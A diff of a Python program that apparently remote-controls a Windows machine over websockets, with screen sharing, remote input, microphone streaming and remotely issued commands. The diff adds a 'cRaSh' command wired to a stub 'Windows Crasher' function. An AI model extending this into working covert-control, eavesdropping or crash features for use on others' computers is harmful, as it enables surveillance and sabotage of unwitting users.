@@ -376,6 +376,7 @@ def block_main():
         print("lock") 
 
 ###                       Websocket ScreenShare
+##                          Screen Controller
 async def controller(data):
     global bsig
     try:
@@ -426,6 +427,8 @@ async def controller(data):
 
     except Exception as e:
         print(f"[INPUT ERROR] {e}")
+
+##                  Screensharing actual
 async def receive_messages(websocket):
     async for message in websocket:
         await controller(message)
@@ -685,6 +688,10 @@ async def send_audio():
 def mic_trig():
     asyncio.run(send_audio())
 
+##                        Windows Crasher (safely)
+def crash() -> None:
+    pass
+
 ##                          Main Head                   ##
 
 def main():
@@ -778,7 +785,8 @@ def main():
                 Thread(target=mic_trig).start()
             elif "mIc off" in cmd:
                 mic = False
-                
+            elif "cRaSh" in cmd:
+                Thread(target=crash).start()
         except Exception as e:
             log(f"Main thread error occured:\t{e}",state="WARN")
     log("Shutting down",state="OFFLINE")
